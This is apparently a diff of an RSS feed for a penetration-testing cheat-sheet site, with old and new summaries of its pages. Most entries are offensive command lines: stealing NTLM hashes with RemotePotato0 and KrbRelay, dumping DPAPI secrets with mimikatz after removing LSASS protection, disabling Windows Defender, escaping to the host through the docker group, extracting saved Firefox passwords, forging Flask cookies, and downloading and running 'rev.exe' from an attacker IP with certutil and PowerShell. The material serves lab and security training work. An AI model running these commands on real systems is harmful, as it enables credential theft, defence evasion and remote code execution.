-      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # PUT a file curl -X PUT http://example.com/example.txt -d @example.txt # PUT a file (with creds) curl -X PUT http://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@example.com/example.txt -d @example.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://example.com/example.txt --data-binary @example.</description>
+      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.10:9999 # Trigger Attack .\RemotePotato0.exe -m 2 -s &amp;lt;TARGET_SESSION_ID&amp;gt; -x 10.10.14.10 -p 9999 Ref: RemotePotato0&#xA;.\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 &amp;#34;C:\ProgramData\KrbRelay.exe -session &amp;lt;TARGET_SESSION_ID&amp;gt; -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm&amp;#34; Ref: KrbRelay</description>
     </item>
     <item>
       <title>Custom Word List Generator</title>
       <link>https://tldrbins.github.io/custom_wordlist_generator/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/custom_wordlist_generator/</guid>
-      <description> CeWL Download CeWL&#xA;# Creating custom wordlist by spidering target website cewl example.com -w wordlist.txt --with-numbers </description>
-    </item>
-    <item>
-      <title>Defender (Windows)</title>
-      <link>https://tldrbins.github.io/windows_defender/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/windows_defender/</guid>
-      <description> Disable defender # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path &amp;#34;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&amp;#34; -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force </description>
+      <description>CeWL # Creating custom wordlist by spidering target website cewl example.com -w wordlist.txt --with-numbers Ref: CeWL</description>
     </item>
     <item>
       <title>disk group</title>
@@ -215,35 +208,35 @@
       <link>https://tldrbins.github.io/docker/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker/</guid>
-      <description>Basic Commands # Show all running processes sudo docker ps -a # Show all images sudo docker images -a # Stop all processes sudo docker stop $(sudo docker ps -a -q) # Remove all processes sudo docker rm -vf $(sudo docker ps -a -q) # Remove all images sudo docker rmi -f $(sudo docker images -aq) Explore Docker image dive&#xA;dive docker-archive://image.tar Abuse #1: Docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it &amp;lt;IMAGE_NAME&amp;gt; bash # Check ls /mnt/root Abuse #2: Docker API # Show running containers curl -s --unix-socket /var/run/docker.</description>
+      <description>Basic Commands # Show all running processes sudo docker ps -a # Show all images sudo docker images -a # Stop all processes sudo docker stop $(sudo docker ps -a -q) # Remove all processes sudo docker rm -vf $(sudo docker ps -a -q) # Remove all images sudo docker rmi -f $(sudo docker images -aq) # Shell in docker sudo docker exec -it &amp;lt;CONTAINER_NAME&amp;gt; sh # Copy file from host to container sudo docker cp &amp;lt;HOST_FILE_PATH&amp;gt; &amp;lt;CONTAINER_ID&amp;gt;:&amp;lt;CONTAINER_FILE_PATH&amp;gt; # Copy file from container to host sudo docker cp &amp;lt;CONTAINER_ID&amp;gt;:&amp;lt;CONTAINER_FILE_PATH&amp;gt; &amp;lt;HOST_FILE_PATH&amp;gt; # Copy folder from host to container sudo docker cp &amp;lt;HOST_FOLDER_PATH&amp;gt;/.</description>
     </item>
     <item>
       <title>Docker Registry</title>
       <link>https://tldrbins.github.io/docker_registry/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker_registry/</guid>
-      <description> API # List repos curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/_catalog # List of tags of this repo curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/tags/list # List manifest file for this tag (e.g. latest) curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/manifests/latest # Get a commit of the image curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/blobs/sha256:&amp;lt;BLOB_HASH&amp;gt;&amp;#39; DockerRegistryGrabber DockerRegistryGrabber&#xA;# List repos python3 drg.py https://example.com -A &amp;lt;TOKEN&amp;gt; --list # Dump repo python3 drg.py https://example.com -A &amp;lt;TOKEN&amp;gt; --dump &amp;lt;REPO&amp;gt; </description>
+      <description>Docker Registry API # List repos curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/_catalog # List of tags of this repo curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/tags/list # List manifest file for this tag (e.g. latest) curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/manifests/latest # Get a commit of the image curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; https://docker.example.com/v2/&amp;lt;REPO_NAME&amp;gt;/blobs/sha256:&amp;lt;BLOB_HASH&amp;gt;&amp;#39; Docker Registry Dump DockerRegistryGrabber # List repos python3 drg.py https://example.com -A &amp;lt;TOKEN&amp;gt; --list # Dump repo python3 drg.</description>
     </item>
     <item>
       <title>dotnet</title>
       <link>https://tldrbins.github.io/dotnet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dotnet/</guid>
-      <description> Compile C# project (From Linux) Download dotnet&#xA;# Check dotnet --info # Prepare mkdir &amp;lt;PROJECT_NAME&amp;gt; cd &amp;lt;PROJECT_NAME&amp;gt; # Init dotnet new console # Create .sln file dotnet new sln # Link .sln to .csproj dotnet sln &amp;lt;PROJECT_NAME&amp;gt;.sln add &amp;lt;PROJECT_NAME&amp;gt;.csproj # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Build solution dotnet build # Run dotnet run </description>
+      <description>Compile C# project Linux # Check dotnet --info # Prepare mkdir &amp;lt;PROJECT_NAME&amp;gt; cd &amp;lt;PROJECT_NAME&amp;gt; # Init dotnet new console # Create .sln file dotnet new sln # Link .sln to .csproj dotnet sln &amp;lt;PROJECT_NAME&amp;gt;.sln add &amp;lt;PROJECT_NAME&amp;gt;.csproj # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Build solution dotnet build -c Release # Run dotnet run Ref: dotnet</description>
     </item>
     <item>
       <title>DPAPI</title>
       <link>https://tldrbins.github.io/dpapi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dpapi/</guid>
-      <description>Abuse #1: Auto dump (From Linux) DonPAPI&#xA;DonPAPI collect -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -t &amp;lt;TARGET&amp;gt; Abuse #1: Auto dump (From Windows - mimikatz) 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Secrets Dump mimikatz.exe &amp;#34;token::elevate&amp;#34; &amp;#34;!+&amp;#34; &amp;#34;!processprotect /process:lsass.exe /remove&amp;#34; &amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::masterkey /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;PROTECT_HASH&amp;gt; /sid:&amp;lt;SID&amp;gt; /password:&amp;lt;PASSWORD&amp;gt; /protected&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#34;exit&amp;#34; Abuse #1: Auto dump (From Windows - SharpDPAPI.</description>
+      <description>Abuse #1: Auto dump (From Linux) Linux DonPAPI collect -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -t &amp;lt;TARGET&amp;gt; Ref: DonPAPI&#xA;Abuse #1: Auto dump (From Windows) mimikatz SharpDPAPI 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Secrets Dump mimikatz.exe &amp;#34;token::elevate&amp;#34; &amp;#34;!+&amp;#34; &amp;#34;!processprotect /process:lsass.exe /remove&amp;#34; &amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::masterkey /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;PROTECT_HASH&amp;gt; /sid:&amp;lt;SID&amp;gt; /password:&amp;lt;PASSWORD&amp;gt; /protected&amp;#34;&amp;#39; &amp;#39;&amp;#34;dpapi::cred /in:C:\Users\&amp;lt;TARGET_UESR&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34;&amp;#39; &amp;#34;exit&amp;#34; # Run as system .</description>
     </item>
     <item>
       <title>Drupal</title>
       <link>https://tldrbins.github.io/drupal/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/drupal/</guid>
-      <description>droopescan Download droopescan&#xA;droopescan scan drupal -u http://example.com Note: This can take a long time to run</description>
+      <description>Enum droopescan droopescan scan drupal -u http://example.com Ref: droopescan Note: This can take a long time to run</description>
     </item>
     <item>
       <title>elasticsearch</title>
@@ -264,84 +257,84 @@
       <link>https://tldrbins.github.io/evil-winrm/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/evil-winrm/</guid>
-      <description> Connect by password evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; Connect by hash evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; Connect by kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; evil-winrm -i &amp;lt;TARGET&amp;gt; -r &amp;lt;DOMAIN&amp;gt; Connect by .crt and .key evil-winrm -i &amp;lt;TARGET&amp;gt; -S -k auth.key -c auth.crt </description>
+      <description>Connection Methods Password Hash Kerberos crt &amp;amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; # Step 1: Edit &amp;#39;/etc/krb5.conf&amp;#39; [libdefaults] default_realm = &amp;lt;DOMAIN&amp;gt; [realms] &amp;lt;DOMAIN&amp;gt; = { kdc = &amp;lt;DC&amp;gt;:88 admin_server = &amp;lt;DC&amp;gt; default_domain = &amp;lt;DOMAIN&amp;gt; } [domain_realm] .domain.internal = &amp;lt;DOMAIN&amp;gt; domain.internal = &amp;lt;DOMAIN&amp;gt; # Step 2: export .ccache export KRB5CCNAME=&amp;lt;CCACHE&amp;gt; # Step 3: Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; evil-winrm -i &amp;lt;TARGET&amp;gt; -r &amp;lt;DC&amp;gt; evil-winrm -i &amp;lt;TARGET&amp;gt; -S -k auth.</description>
     </item>
     <item>
       <title>ExecuteDCOM</title>
       <link>https://tldrbins.github.io/executedcom/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/executedcom/</guid>
-      <description> Abuse #1: ExecuteDCOM (From Linux) # Revshell impacket-dcomexec &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; &amp;#39;&amp;lt;powershell #3 Base64&amp;gt;&amp;#39; -silentcommand -object MMC20 </description>
+      <description> Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec &amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; &amp;#39;&amp;lt;powershell #3 Base64&amp;gt;&amp;#39; -silentcommand -object MMC20 </description>
     </item>
     <item>
       <title>File Transfer (Linux To Linux)</title>
       <link>https://tldrbins.github.io/file_transfer_linux_to_linux/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_linux_to_linux/</guid>
-      <description>HTTP # Start a local HTTP server python3 -m http.server 80 # In target Linux machine wget &amp;lt;LOCAL_IP&amp;gt;/&amp;lt;FILE&amp;gt; # In target Linux machine curl &amp;lt;LOCAL_IP&amp;gt;/&amp;lt;FILE&amp;gt; -o &amp;lt;REMOTE_DEST_PATH&amp;gt; nc # In our local Linux machine nc -lvnp 4444 &amp;lt; &amp;lt;FILE&amp;gt; # In target Linux machine nc -w3 &amp;lt;LOCAL_IP&amp;gt; 4444 &amp;gt; &amp;lt;FILE&amp;gt; scp Remote to Local # If you have target password scp &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; # If you have a ssh key scp -i id_rsa &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; Local to Remote # If you have target password scp &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; # If you have a ssh key scp -i id_rsa &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; pipe Local to Remote # In our local Linux machine cat &amp;lt;FILE&amp;gt; | nc -lnvp 4444 # In target Linux machine exec 3&amp;lt;&amp;gt;/dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/4444 # Ctrl+C to interrupt after some time cat &amp;lt;&amp;amp;3 &amp;gt; &amp;lt;FILE&amp;gt; # Check md5sum &amp;lt;FILE&amp;gt; Base64 Encoding (for small binary) # Base64 encode binary cat &amp;lt;FILE&amp;gt; | base64 -w0 # Copy and paste the base64 encoded binary echo -n &amp;#39;&amp;lt;BASE64_FILE&amp;gt;&amp;#39; | base64 -d &amp;gt; &amp;lt;FILE&amp;gt; Note: For restricted environment</description>
+      <description>HTTP nc scp PIPE Base64 # Start a local HTTP server python3 -m http.server 80 # In target Linux machine wget &amp;lt;LOCAL_IP&amp;gt;/&amp;lt;FILE&amp;gt; # In target Linux machine curl &amp;lt;LOCAL_IP&amp;gt;/&amp;lt;FILE&amp;gt; -o &amp;lt;REMOTE_DEST_PATH&amp;gt; # In our local Linux machine nc -lvnp 4444 &amp;lt; &amp;lt;FILE&amp;gt; # In target Linux machine nc -w3 &amp;lt;LOCAL_IP&amp;gt; 4444 &amp;gt; &amp;lt;FILE&amp;gt; Remote to Local # If you have target password scp &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; # If you have a ssh key scp -i id_rsa &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; Local to Remote # If you have target password scp &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; # If you have a ssh key scp -i id_rsa &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; Local to Remote # In our local Linux machine cat &amp;lt;FILE&amp;gt; | nc -lnvp 4444 # In target Linux machine exec 3&amp;lt;&amp;gt;/dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/4444 # Ctrl+C to interrupt after some time cat &amp;lt;&amp;amp;3 &amp;gt; &amp;lt;FILE&amp;gt; # Check md5sum &amp;lt;FILE&amp;gt; Small binary # Base64 encode binary cat &amp;lt;FILE&amp;gt; | base64 -w0 # Copy and paste the base64 encoded binary echo -n &amp;#39;&amp;lt;BASE64_FILE&amp;gt;&amp;#39; | base64 -d &amp;gt; &amp;lt;FILE&amp;gt; Note: For restricted environment</description>
     </item>
     <item>
       <title>File Transfer (Linux to Windows)</title>
       <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
-      <description>HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe &amp;amp;&amp;amp; C:\ProgramData\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: PowerShell 3.0+&#xA;# Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: curl is not always available</description>
+      <description>CMD Powershell evil-winrm Start a Local HTTP Server python3 -m http.server 80 certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe &amp;amp;&amp;amp; C:\ProgramData\rev.exe Start a Local HTTP Server python3 -m http.server 80 # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: PowerShell 3.0+&#xA;# Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe # Short version powershell -ep bypass curl 10.</description>
     </item>
     <item>
       <title>File Transfer (Windows To Linux)</title>
       <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
-      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:&amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # From target Windows to local Linux copy example.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\example.txt example.txt # Delete file del example.txt # Remove SMB share net use /d \\10.10.14.10\share # Older Windows (e.</description>
+      <description>SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:&amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # From target Windows to local Linux copy example.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\example.txt example.txt # Delete file del example.txt # Remove SMB share net use /d \\10.10.14.10\share # Older Windows (e.</description>
     </item>
     <item>
       <title>Find</title>
       <link>https://tldrbins.github.io/find/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/find/</guid>
-      <description>Locate a file locate cmd.php Find files of type file find . -type f Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by user find / -user user -ls 2&amp;gt;/dev/null | grep -v -e &amp;#34; \/proc&amp;#34; -e &amp;#34; \/sys&amp;#34; Find files owned by group find / -group adm 2&amp;gt;/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 !</description>
+      <description>Linux Locate a file locate cmd.php Find files of type file find . -type f Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by user find / -user user -ls 2&amp;gt;/dev/null | grep -v -e &amp;#34; \/proc&amp;#34; -e &amp;#34; \/sys&amp;#34; Find files owned by group find / -group adm 2&amp;gt;/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 !</description>
     </item>
     <item>
       <title>Find (Windows)</title>
       <link>https://tldrbins.github.io/find_windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/find_windows/</guid>
-      <description> Show hidden files Get-ChildItem -force Find a file ls -path \Users -Filter example.txt -recurse -erroraction silent where /R C:\Users example.txt Find a file, with rules dir /s /b /a:-d-h \Users\Administrator | findstr /i /v &amp;#34;appdata&amp;#34; +---------------------------------------+ |dir: | |/s : include subfolders | |/b : bare format | |/a:-d-h : exclude directories or hidden| | | |findstr: | |/i : case insensitive | |/v appdata : exclude &amp;#39;appdata&amp;#39; | +---------------------------------------+ </description>
+      <description> Windows Show hidden files Get-ChildItem -force Find a file ls -path \Users -Filter example.txt -recurse -erroraction silent where /R C:\Users example.txt Find a file, with rules dir /s /b /a:-d-h \Users\Administrator | findstr /i /v &amp;#34;appdata&amp;#34; +---------------------------------------+ |dir: | |/s : include subfolders | |/b : bare format | |/a:-d-h : exclude directories or hidden| | | |findstr: | |/i : case insensitive | |/v appdata : exclude &amp;#39;appdata&amp;#39; | +---------------------------------------+ </description>
     </item>
     <item>
       <title>Finger Protocol</title>
       <link>https://tldrbins.github.io/finger/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/finger/</guid>
-      <description> Basic # Check logged in users finger @10.10.11.10 # Check valid user finger &amp;lt;USER&amp;gt;@10.10.11.10 Brute force usernames finger-user-enum&#xA;perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.11.10 </description>
+      <description>Basic # Check logged in users finger @10.10.11.10 # Check valid user finger &amp;lt;USER&amp;gt;@10.10.11.10 Brute force usernames perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.11.10 Ref: finger-user-enum</description>
     </item>
     <item>
       <title>Firefox</title>
       <link>https://tldrbins.github.io/firefox/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/firefox/</guid>
-      <description> Extract saved passwords firefox_decrypt firefox_decrypt&#xA;# Auto detect path python3 firefox_decrypt.py # Specify path python3 firefox_decrypt.py /&amp;lt;PATH&amp;gt;/profiles.ini/ firepwd firepwd&#xA;# With key4.db, logins.json in the same directory python3 firepwd.py </description>
+      <description>Extract saved passwords firefox_decrypt firepwd # Auto detect path python3 firefox_decrypt.py # Specify path python3 firefox_decrypt.py /&amp;lt;PATH&amp;gt;/profiles.ini/ Ref: firefox_decrypt&#xA;# With key4.db, logins.json in the same directory python3 firepwd.py Ref: firepwd</description>
     </item>
     <item>
       <title>Firewall (Windows)</title>
       <link>https://tldrbins.github.io/firewall_windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/firewall_windows/</guid>
-      <description> Check Firewall Rules # cmd cmd /c &amp;#34;netsh advfirewall firewall show rule name=all|findstr Name:&amp;#34; # powershell Get-NetFirewallProfile # Check outbound rules Get-NetFirewallRule -Direction Outbound -Enabled True # Pretty Print powershell -c &amp;#34;Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name=&amp;#39;Protocol&amp;#39;;Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name=&amp;#39;LocalPort&amp;#39;;Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name=&amp;#39;RemotePort&amp;#39;;Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name=&amp;#39;RemoteAddress&amp;#39;;Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action&amp;#34; Add Inbound Rules # Allow all inbound traffic from local subnet New-NetFirewallRule -DisplayName &amp;#34;Allow All&amp;#34; -Direction Inbound -Enabled True -RemoteAddress LocalSubnet -Action Allow -Protocol TCP -Profile ANY </description>
+      <description> Windows Check Firewall Rules # cmd cmd /c &amp;#34;netsh advfirewall firewall show rule name=all|findstr Name:&amp;#34; # powershell Get-NetFirewallProfile # Check outbound rules Get-NetFirewallRule -Direction Outbound -Enabled True # Pretty Print powershell -c &amp;#34;Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name=&amp;#39;Protocol&amp;#39;;Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name=&amp;#39;LocalPort&amp;#39;;Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name=&amp;#39;RemotePort&amp;#39;;Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name=&amp;#39;RemoteAddress&amp;#39;;Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action&amp;#34; Add Inbound Rules # Allow all inbound traffic from local subnet New-NetFirewallRule -DisplayName &amp;#34;Allow All&amp;#34; -Direction Inbound -Enabled True -RemoteAddress LocalSubnet -Action Allow -Protocol TCP -Profile ANY </description>
     </item>
     <item>
       <title>Flask Cookie</title>
       <link>https://tldrbins.github.io/flask_cookie/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/flask_cookie/</guid>
-      <description> flask-unsign pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
